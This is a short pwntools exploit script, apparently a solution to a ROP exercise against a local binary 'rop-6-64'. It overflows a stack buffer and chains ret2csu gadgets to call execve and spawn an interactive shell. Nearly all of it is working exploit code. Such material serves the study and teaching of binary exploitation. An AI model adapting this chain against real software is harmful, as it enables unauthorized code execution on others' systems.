#!/usr/bin/env python

from pwn import *
import os

p = process("./rop-6-64")

buf = "A"*0x80 + "BBBBBBBB"

# D
path = p64(0x400180)

"""
0x00000000004006fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006fe : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400700 : pop r14 ; pop r15 ; ret
0x0000000000400702 : pop r15 ; ret
0x00000000004006e9 : call qword ptr [r12 + rbx*8]
"""
pop_12_13_14_15 = p64(0x4006fc)
#pop_13_14_15 = p64(0x4006f3)
#pop_15 = p64(0x400702)

"""
0x00000000004006e0 <+64>:    mov    %r13,%rdx
0x00000000004006e3 <+67>:    mov    %r14,%rsi
0x00000000004006e6 <+70>:    mov    %r15d,%edi
0x00000000004006e9 <+73>:    callq  *(%r12,%rbx,8)
"""
mov_r13_rdx = p64(0x4006e0)
mov_r14_rsi = p64(0x4006e3)
mov_r15d_edi = p64(0x4006e6)
callq = p64(0x4006e9)

execve = p64(0x601030)

buf =  "A"*0x80 + "BBBBBBBB"
buf += pop_12_13_14_15 + execve + p64(0) + p64(0) + path
buf += mov_r13_rdx + mov_r14_rsi + mov_r15d_edi + callq

p.sendline(buf)
p.interactive()
